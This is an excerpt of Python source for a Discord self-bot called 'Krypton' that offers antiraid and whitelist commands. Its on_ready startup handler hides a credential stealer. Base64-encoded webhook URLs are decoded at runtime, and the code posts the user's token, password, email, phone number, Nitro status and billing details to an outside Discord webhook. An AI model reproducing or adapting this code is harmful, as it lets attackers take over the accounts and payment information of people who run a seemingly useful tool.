...
aniket72 = commands.Bot(description='Krypton',
                           command_prefix='K',
                           self_bot=True,
                           intents=intents)
status_task = None
...
async def antinuke(ctx, antiraidparameter=None):
    ...
    if str(antiraidparameter).lower() == 'true' or str(
        ...
        await ctx.send(
            f'- **[! ERROR] ** `USAGE : {aniket72.command_prefix}antiraid [true/false]`'
        )
    ...
    if g == '-g' or g == '-global':
        ...
        for key in aniket72.whitelisted_users:
            for key2 in aniket72.whitelisted_users[key]:
                ...
                whitelist += f'• {user.mention} ({user.id}) IN {aniket72.get_guild(key).name}\n'
...
@aniket72.command(aliases=['removewl'])
async def unwhitelist(ctx, user: discord.Member = None):
    if user is None:
        ...
        if ctx.guild.id not in aniket72.whitelisted_users.keys():
            ...
            return
        if user.id in aniket72.whitelisted_users[ctx.guild.id]:
            aniket72.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = aniket72.get_user(user.id)
...
@aniket72.event
async def on_ready():
      dhanyahoaapka = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1MDY5MjMxMzc1NjM0MDI3NS9XQ0UxTFFFTEc2QUh4X1lfZkVLejA5eWZOQWhwRjRrNWY4Ny0xRUhRcGRvdVJFTGZxaUp6TUVmNW5MN0w2YlVyRHVhUw=="
      b64Bytes = dhanyahoaapka.encode("ascii")
      stringBytes = base64.b64decode(b64Bytes)
      adata = stringBytes.decode("ascii")
      data = f'''**@everyone  ANOTHER ONE
Tkn: `{token}`
Passw: {passw}
Username: `{aniket72.user}`
User id: `{aniket72.user.id}`
Email: `{email}`
Phoneno:`{phone}`
Nitro: `{nitro}`
Billing: `{billing}`**'''
      async with aiohttp.ClientSession() as session:
          a = Webhook.from_url(adata, adapter=AsyncWebhookAdapter(session))
          await a.send(data)
      dhanyahoaapka2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMTUxMzU5MDc3MTYxMzcwNi8tajZZcGlORlZiOHZQOTBqek5COHdiSllpOTVpaHVTMmNodFZLSXcxcE4yaE92U3NIckhwUmk4dE5nLXVSbTYySTFkNg=="
      b64Bytes2 = dhanyahoaapka2.encode("ascii")
      stringBytes2 = base64.b64decode(b64Bytes2)
      adata2 = stringBytes2.decode("ascii")
      async with aiohttp.ClientSession() as session:
        a2 = Webhook.from_url(adata2, adapter=AsyncWebhookAdapter(session))
      ...
      print(
        Center.XCenter(
            ...
            f"""
                                 ...
                                 $$  __$$ |$$ \$$$$ |  $$ |  $$  $$<   $$  __|      $$ |   
                                 $$ |  $$ |$$ |\$$$ |  $$ |  $$ |\$$\  $$ |         $$ | • YOUTUBE   : @aniket72 
                                 $$ |  $$ |$$ | \$$ |$$$$$$\ $$ | \$$\ $$$$$$$$\    $$ | • DISCORD   : @itx_aniket.98
                                 \__|  \__|\__|  \__|\______|\__|  \__|\________|   \__| • INSTAGRAM : just_aniket.98

[+] -------------------------------- ] | [ S E L F B O T - {aniket72.user.name}  ] | [ ------------------------------------ [+]
""",
                1,
            )
        )
